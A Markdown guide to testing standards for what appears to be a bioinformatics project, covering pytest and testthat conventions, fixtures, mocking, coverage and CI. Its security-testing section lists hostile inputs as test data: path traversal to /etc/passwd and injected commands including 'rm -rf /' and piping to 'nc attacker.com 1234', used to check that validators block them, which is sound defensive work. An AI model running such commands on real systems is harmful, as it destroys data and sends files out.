# Testing Standards and Practices

## Core Principles

- **Coverage target: ≥80%** for all code
- Write tests before or alongside implementation (TDD/BDD)
- Test one thing per test function
- Use descriptive test names that explain what is being tested
- Follow Arrange-Act-Assert (AAA) pattern
- Mock external dependencies

## Test Organization

### Directory Structure

```
project/
├── src/
│   ├── __init__.py
│   ├── analysis.py
│   ├── validation.py
│   └── tools.py
├── tests/
│   ├── __init__.py
│   ├── conftest.py           # Shared fixtures
│   ├── unit/
│   │   ├── test_analysis.py
│   │   ├── test_validation.py
│   │   └── test_tools.py
│   ├── integration/
│   │   ├── test_pipeline.py
│   │   └── test_workflows.py
│   └── fixtures/
│       ├── sample.fastq
│       ├── reference.fa
│       └── test_data.vcf
```

## Python Testing with pytest

### Test Naming Convention

```python
def test_<function>_when_<condition>_then_<expected>():
    """Test naming pattern for clarity."""
    pass

# Examples:
def test_validate_path_when_outside_workdir_then_raises():
    """Test validate_path rejects paths outside work directory."""
    pass

def test_calculate_gc_content_when_empty_sequence_then_returns_zero():
    """Test GC content calculation with empty sequence."""
    pass

def test_parse_vcf_when_valid_file_then_returns_variants():
    """Test VCF parsing with valid input file."""
    pass
```

### Arrange-Act-Assert Pattern

```python
import pytest
from pathlib import Path

def test_validate_fastq_when_invalid_header_then_raises():
    """Test FASTQ validation rejects invalid header."""
    # Arrange - Set up test data and expectations
    test_file = Path("test_data/invalid.fastq")
    test_file.parent.mkdir(exist_ok=True)
    test_file.write_text(">not_fastq_header\nACGT\n+\n!!!!\n")
    
    # Act & Assert - Execute and verify
    with pytest.raises(ValidationError, match="Invalid FASTQ header"):
        validate_fastq(str(test_file))
    
    # Cleanup
    test_file.unlink()

def test_calculate_gc_content_when_mixed_case_then_case_insensitive():
    """Test GC content calculation is case-insensitive."""
    # Arrange
    sequence = "AcGtCgTa"
    expected_gc = 0.5  # 4 out of 8 bases are G or C
    
    # Act
    result = calculate_gc_content(sequence)
    
    # Assert
    assert result == pytest.approx(expected_gc)
```

### Fixtures for Reusable Test Data

```python
# conftest.py
import pytest
from pathlib import Path
import tempfile

@pytest.fixture
def sample_fastq():
    """Provide a sample FASTQ file for testing."""
    content = """@SEQ_ID
GATTTGGGGTTCAAAGCAGTATCGATCAAATAGTAAATCCATTTGTTCAACTCACAGTTT
+
!''*((((***+))%%%++)(%%%%).1***-+*''))**55CCF>>>>>>CCCCCCC65
"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.fastq', delete=False) as f:
        f.write(content)
        fastq_path = f.name
    
    yield fastq_path
    
    # Cleanup
    Path(fastq_path).unlink()

@pytest.fixture
def temp_workdir():
    """Provide a temporary working directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)

@pytest.fixture
def mock_reference_genome(temp_workdir):
    """Create a mock reference genome file."""
    ref_path = temp_workdir / "reference.fa"
    ref_path.write_text(">chr1\nACGTACGTACGT\n>chr2\nGGCCAAGGCCAA\n")
    return ref_path

# Use fixtures in tests
def test_alignment_with_reference(sample_fastq, mock_reference_genome, temp_workdir):
    """Test read alignment uses correct reference."""
    # Arrange
    output_bam = temp_workdir / "output.bam"
    
    # Act
    result = align_reads(sample_fastq, str(mock_reference_genome), str(output_bam))
    
    # Assert
    assert output_bam.exists()
    assert result["status"] == "success"
```

### Parametrized Tests

```python
@pytest.mark.parametrize("sequence,expected_gc", [
    ("AAAA", 0.0),
    ("GGGG", 1.0),
    ("CCCC", 1.0),
    ("TTTT", 0.0),
    ("ACGT", 0.5),
    ("ACGTACGT", 0.5),
    ("", 0.0),
])
def test_calculate_gc_content_with_various_sequences(sequence, expected_gc):
    """Test GC content calculation with multiple sequences."""
    result = calculate_gc_content(sequence)
    assert result == pytest.approx(expected_gc)

@pytest.mark.parametrize("quality_format,min_score,max_score", [
    ("phred33", 0, 93),
    ("phred64", 0, 62),
])
def test_validate_quality_scores_with_formats(quality_format, min_score, max_score):
    """Test quality score validation for different formats."""
    valid_scores = [min_score, (min_score + max_score) // 2, max_score]
    validate_quality_scores(valid_scores, quality_format)  # Should not raise
    
    invalid_scores = [min_score - 1, max_score + 1]
    with pytest.raises(ValidationError):
        validate_quality_scores(invalid_scores, quality_format)
```

### Mocking External Dependencies

```python
from unittest.mock import Mock, patch, MagicMock
import pytest

def test_fetch_annotation_when_database_unavailable_then_uses_cache():
    """Test annotation fetching falls back to cache when DB is down."""
    # Arrange
    gene_id = "ENSG00000139618"
    cached_annotation = {"gene_id": gene_id, "symbol": "BRCA2"}
    
    # Mock the database fetch to fail
    with patch('src.annotation.fetch_from_database', side_effect=ConnectionError):
        with patch('src.annotation.fetch_from_cache', return_value=cached_annotation):
            # Act
            result = get_gene_annotation(gene_id)
            
            # Assert
            assert result == cached_annotation

def test_run_alignment_when_tool_fails_then_raises():
    """Test alignment raises error when external tool fails."""
    # Arrange
    mock_subprocess = Mock()
    mock_subprocess.returncode = 1
    mock_subprocess.stderr = "Error: reference not found"
    
    with patch('subprocess.run', return_value=mock_subprocess):
        # Act & Assert
        with pytest.raises(ToolExecutionError, match="reference not found"):
            run_alignment("reads.fastq", "ref.fa", "out.bam")
```

### Testing Exceptions

```python
def test_validate_path_when_outside_workdir_then_raises():
    """Test path validation rejects paths outside work directory."""
    # Arrange
    work_dir = "/safe/directory"
    malicious_path = "/safe/directory/../../../etc/passwd"
    
    # Act & Assert
    with pytest.raises(SecurityError):
        validate_path(malicious_path, work_dir)

def test_parse_vcf_when_missing_header_then_raises_with_message():
    """Test VCF parser raises with helpful message when header missing."""
    # Arrange
    invalid_vcf = "chr1\t100\t.\tA\tG\t.\t.\t.\n"
    
    # Act & Assert
    with pytest.raises(ValidationError, match="Missing VCF header"):
        parse_vcf_string(invalid_vcf)
```

## Integration Testing

### Testing Complete Workflows

```python
def test_full_rnaseq_pipeline(temp_workdir, sample_fastq, mock_reference_genome):
    """Test complete RNA-seq analysis pipeline."""
    # Arrange
    output_dir = temp_workdir / "results"
    output_dir.mkdir()
    
    config = {
        "fastq": str(sample_fastq),
        "reference": str(mock_reference_genome),
        "output": str(output_dir),
        "threads": 1
    }
    
    # Act
    pipeline = RNASeqPipeline(config)
    results = pipeline.run()
    
    # Assert
    assert results["status"] == "success"
    assert (output_dir / "aligned.bam").exists()
    assert (output_dir / "counts.txt").exists()
    assert results["alignment_rate"] > 0.5

def test_variant_calling_workflow_with_mock_data():
    """Test variant calling with controlled test data."""
    # Arrange - Create test data with known variants
    bam_file = create_mock_bam_with_variants([
        {"chr": "chr1", "pos": 1000, "ref": "A", "alt": "G"},
        {"chr": "chr1", "pos": 2000, "ref": "C", "alt": "T"},
    ])
    
    # Act
    variants = call_variants(bam_file, reference="ref.fa")
    
    # Assert
    assert len(variants) == 2
    assert variants[0]["pos"] == 1000
    assert variants[1]["alt"] == "T"
```

## R Testing with testthat

### Basic Test Structure

```r
library(testthat)

test_that("calculate_gc_content returns correct proportion", {
  # Arrange
  sequence <- "ACGTACGT"
  expected <- 0.5
  
  # Act
  result <- calculate_gc_content(sequence)
  
  # Assert
  expect_equal(result, expected)
})

test_that("validate_metadata rejects missing required columns", {
  # Arrange
  incomplete_df <- data.frame(sample_id = c("S1", "S2"))
  
  # Act & Assert
  expect_error(
    validate_metadata(incomplete_df),
    regexp = "Missing required column"
  )
})

test_that("DESeq2 analysis returns correct result structure", {
  # Arrange
  counts <- matrix(rpois(1000, 10), ncol = 10)
  metadata <- data.frame(
    condition = rep(c("A", "B"), each = 5),
    batch = rep(1:5, 2)
  )
  
  # Act
  results <- run_deseq2(counts, metadata)
  
  # Assert
  expect_s3_class(results, "data.frame")
  expect_true("padj" %in% names(results))
  expect_true("log2FoldChange" %in% names(results))
})
```

## Security Testing

### Path Validation Tests

```python
@pytest.mark.parametrize("malicious_path", [
    "../../../etc/passwd",
    "/etc/passwd",
    "safe/../../../etc/passwd",
    "safe/../../outside",
])
def test_validate_path_rejects_directory_traversal(malicious_path):
    """Test path validation blocks directory traversal attempts."""
    work_dir = "/safe/work/dir"
    
    with pytest.raises(SecurityError):
        validate_path(malicious_path, work_dir)

def test_validate_path_accepts_safe_relative_paths():
    """Test path validation allows safe relative paths."""
    work_dir = "/safe/work/dir"
    safe_paths = ["data/file.txt", "results/output.bam", "./local.vcf"]
    
    for path in safe_paths:
        result = validate_path(path, work_dir)
        assert result.startswith(work_dir)
```

### Command Injection Tests

```python
def test_run_command_when_injection_attempted_then_blocks():
    """Test command execution blocks injection attempts."""
    malicious_inputs = [
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 1234",
    ]
    
    for malicious in malicious_inputs:
        with pytest.raises(SecurityError):
            run_safe_command(["cat", malicious])
```

## Performance Testing

### Benchmarking Tests

```python
import pytest
import time

@pytest.mark.benchmark
def test_large_vcf_parsing_performance(benchmark):
    """Benchmark VCF parsing performance."""
    large_vcf = create_vcf_with_n_variants(10000)
    
    result = benchmark(parse_vcf, large_vcf)
    
    assert len(result) == 10000

@pytest.mark.slow
def test_alignment_completes_within_timeout():
    """Test alignment completes in reasonable time."""
    start = time.time()
    
    run_alignment("large.fastq", "ref.fa", "out.bam")
    
    elapsed = time.time() - start
    assert elapsed < 300  # Should complete within 5 minutes
```

## Coverage Requirements

### Running Coverage

```bash
# Run tests with coverage
pytest tests/ --cov=src --cov-report=term-missing --cov-fail-under=80

# Generate HTML coverage report
pytest tests/ --cov=src --cov-report=html

# Coverage for specific module
pytest tests/unit/test_validation.py --cov=src.validation --cov-report=term
```

### Coverage Configuration

```ini
# setup.cfg or pyproject.toml
[tool:pytest]
testpaths = tests
addopts = 
    --cov=src
    --cov-report=term-missing
    --cov-report=html
    --cov-fail-under=80
    -v

[coverage:run]
source = src
omit = 
    */tests/*
    */venv/*
    */__pycache__/*

[coverage:report]
exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError
    if __name__ == .__main__.:
    if TYPE_CHECKING:
```

## Test Best Practices

### Do's

```python
# ✅ GOOD: Descriptive test names
def test_validate_vcf_when_missing_header_then_raises():
    pass

# ✅ GOOD: One assertion per test (or closely related)
def test_gc_content_calculation():
    assert calculate_gc_content("ACGT") == 0.5

# ✅ GOOD: Use fixtures for common setup
@pytest.fixture
def sample_data():
    return {"reads": 1000, "mapped": 950}

# ✅ GOOD: Test edge cases
def test_empty_sequence():
    assert calculate_gc_content("") == 0.0
```

### Don'ts

```python
# ❌ BAD: Vague test name
def test_function():
    pass

# ❌ BAD: Testing too many things
def test_everything():
    assert func1() == "a"
    assert func2() == "b"
    assert func3() == "c"

# ❌ BAD: Not testing exceptions
def test_invalid_input():
    result = validate("bad")  # Should check that it raises!

# ❌ BAD: Tests depending on each other
result = None
def test_step1():
    global result
    result = setup()

def test_step2():  # Depends on test_step1
    process(result)
```

## Continuous Integration

### GitHub Actions Workflow

```yaml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.9", "3.10", "3.11"]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        pip install -e ".[dev]"
    
    - name: Run tests with coverage
      run: |
        pytest tests/ --cov=src --cov-report=xml --cov-fail-under=80
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        files: ./coverage.xml
```
